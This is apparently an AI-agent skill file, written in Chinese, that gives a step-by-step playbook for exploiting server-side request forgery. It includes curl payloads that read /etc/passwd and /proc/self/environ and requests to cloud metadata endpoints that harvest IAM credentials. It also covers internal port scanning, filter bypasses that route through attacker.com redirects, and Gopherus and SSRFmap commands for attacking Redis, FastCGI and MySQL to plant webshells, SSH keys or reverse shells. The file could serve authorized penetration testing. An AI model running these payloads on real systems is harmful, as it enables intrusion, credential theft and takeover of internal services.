---
name: ssrf
description: "检测与利用服务端请求伪造(SSRF)漏洞，包括绕过SSRF过滤器、枚举内网服务、探测云元数据、测试盲SSRF及通过gopher协议攻击后端服务。当目标存在URL参数、远程文件加载、Webhook、PDF生成、URL预览功能时使用。"
allowed-tools: Bash, Read, Write
---

# 服务端请求伪造 (SSRF)

利用服务器发起请求，访问内网资源、读取本地文件或攻击其他服务。

## 决策流程

```
目标功能识别
├── 存在 URL 参数/远程加载？
│   ├── 是 → 阶段一：确认SSRF
│   │   ├── 有响应回显 → 经典SSRF流程
│   │   └── 无回显 → 盲SSRF流程（外部回调确认）
│   └── 否 → 检查隐藏参数（Webhook、PDF生成、导入导出）
├── SSRF已确认？
│   ├── 是 → 阶段二：探测范围
│   │   ├── 测试协议支持（file/gopher/dict）
│   │   ├── 云元数据探测（169.254.169.254）
│   │   └── 内网端口扫描
│   └── 被过滤 → 阶段三：绕过（见 bypass-payloads.md）
├── 可利用目标已发现？
│   └── 是 → 阶段四：深度利用（见 exploitation-payloads.md）
└── 所有路径结束 → 记录发现，输出报告
```

## 常见指示器

- URL 参数：`url=`, `link=`, `src=`, `target=`, `fetch=`, `uri=`, `path=`, `dest=`
- 图片/文件远程加载功能
- Webhook 配置接口
- PDF 生成（从 URL 获取内容）
- URL 预览/缩略图/短链解析功能
- 导入/导出功能（从 URL）
- 头像 URL 设置
- OAuth 回调 URL

## 阶段一：确认 SSRF

### 1.1 外部回调确认

```bash
# 使用外部服务器（Burp Collaborator / 自建服务器）确认出站请求
curl "http://target.com/fetch?url=http://your-callback-server.com/ssrf-test"
```

> **验证点**：检查回调服务器是否收到请求。记录 User-Agent、源 IP、请求头。

### 1.2 本地回环测试

```bash
curl "http://target.com/fetch?url=http://127.0.0.1"
curl "http://target.com/fetch?url=http://localhost"
```

> **验证点**：对比正常响应与回环响应的差异（状态码、响应体大小、响应时间）。

### 1.3 协议探测

```bash
# file 协议 - 读取本地文件
curl "http://target.com/fetch?url=file:///etc/passwd"

# gopher 协议 - 探测内网服务
curl "http://target.com/fetch?url=gopher://127.0.0.1:6379/_info"

# dict 协议 - 探测服务信息
curl "http://target.com/fetch?url=dict://127.0.0.1:6379/info"
```

> **验证点**：确认支持哪些协议。file 协议可直接读文件；gopher 可构造任意 TCP 数据包。

## 阶段二：探测范围

### 2.1 云元数据服务

核心端点（按优先级测试）：

```bash
# AWS IMDSv1（最常见）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP（需 Header: Metadata-Flavor: Google）
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 阿里云
http://100.100.100.200/latest/meta-data/
```

> **验证点**：成功读取元数据 = 高危。立即检查 IAM 凭证、用户数据中的密钥。

### 2.2 内网端口扫描

通过响应差异（时间/状态码/内容长度）判断端口状态：

```bash
# 常见高价值端口
http://127.0.0.1:22/    # SSH
http://127.0.0.1:3306/  # MySQL
http://127.0.0.1:6379/  # Redis
http://127.0.0.1:9000/  # FastCGI
http://127.0.0.1:9200/  # Elasticsearch
http://127.0.0.1:27017/ # MongoDB
http://127.0.0.1:11211/ # Memcached
http://127.0.0.1:8080/  # 内部 Web 服务
```

> **验证点**：记录开放端口列表。端口开放 = 响应时间短或有特征性错误信息。

### 2.3 本地文件读取（file 协议）

```bash
# Linux 关键文件
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ    # 环境变量（可能含密钥）
file:///proc/self/cmdline    # 进程命令行

# Windows
file:///c:/windows/win.ini
```

> **验证点**：成功读取文件内容即确认 file 协议可用。优先读取 `/proc/self/environ` 获取敏感信息。

## 阶段三：绕过过滤

当基础 SSRF 被拦截时，按以下顺序尝试绕过。完整 payload 列表见 [bypass-payloads.md](bypass-payloads.md)。

### 3.1 IP 地址变形

```bash
# 十进制转换：127.0.0.1 = 2130706433
http://2130706433/

# 十六进制
http://0x7f000001/

# 八进制
http://0177.0.0.01/

# 缩写
http://127.1/
http://0/
```

### 3.2 DNS 绕过

```bash
# 解析到 127.0.0.1 的公共域名
http://127.0.0.1.nip.io/
http://localtest.me/

# DNS Rebinding：TTL=0，首次解析外部 IP 通过检查，二次解析返回内网 IP
```

### 3.3 重定向绕过

```bash
# 在自己服务器设置 302 重定向到内网地址
# redirect.php: <?php header("Location: http://127.0.0.1/"); ?>
http://attacker.com/redirect.php
```

### 3.4 URL 解析差异

```bash
http://attacker.com@127.0.0.1/     # @ 符号
http://127.0.0.1#attacker.com/     # # 符号
http://attacker.com\@127.0.0.1/    # 反斜杠
```

> **验证点**：每种绕过技术尝试后，检查是否成功访问到内网资源。记录有效绕过方法。

## 阶段四：深度利用

发现可达的内网服务后，利用 gopher 协议构造攻击。详细 payload 见 [exploitation-payloads.md](exploitation-payloads.md)。

### 4.1 攻击 Redis（端口 6379）

```bash
# 使用 Gopherus 生成 payload
python gopherus.py --exploit redis

# 攻击路径：写入 webshell / SSH 公钥 / crontab 反弹 shell
# 完整 gopher payload 见 exploitation-payloads.md
```

> **验证点**：确认 Redis 未设密码（dict://127.0.0.1:6379/info 有响应）后再尝试写入。

### 4.2 攻击 FastCGI（端口 9000）

```bash
# 使用 Gopherus 生成 FastCGI payload
python gopherus.py --exploit fastcgi

# 可执行任意 PHP 代码
```

> **验证点**：确认 FastCGI 端口开放且可达后，用生成的 payload 测试命令执行。

### 4.3 攻击 MySQL（端口 3306）

```bash
# 无密码 MySQL 可通过 gopher 执行 SQL
python gopherus.py --exploit mysql
```

## 工具参考

### SSRFmap

```bash
python ssrfmap.py -r request.txt -p url -m portscan   # 端口扫描
python ssrfmap.py -r request.txt -p url -m readfiles   # 读取文件
python ssrfmap.py -r request.txt -p url -m redis       # 攻击 Redis
```

### Gopherus

```bash
python gopherus.py --exploit redis     # Redis payload
python gopherus.py --exploit fastcgi   # FastCGI payload
python gopherus.py --exploit mysql     # MySQL payload
```

## 最佳实践

1. **先确认再利用**：用外部回调服务器确认 SSRF 存在后，再深入测试
2. **优先检查云元数据**：169.254.169.254 是最高价值目标（可能获取 IAM 凭证）
3. **注意响应差异**：盲 SSRF 通过时间差、状态码、内容长度差异判断
4. **系统化绕过**：被过滤时按 IP变形 → DNS绕过 → 重定向 → URL解析差异 顺序尝试
5. **记录所有发现**：端口状态、可用协议、有效绕过方法，为后续利用提供信息
6. **gopher 协议是关键**：支持 gopher = 可以攻击几乎所有 TCP 服务
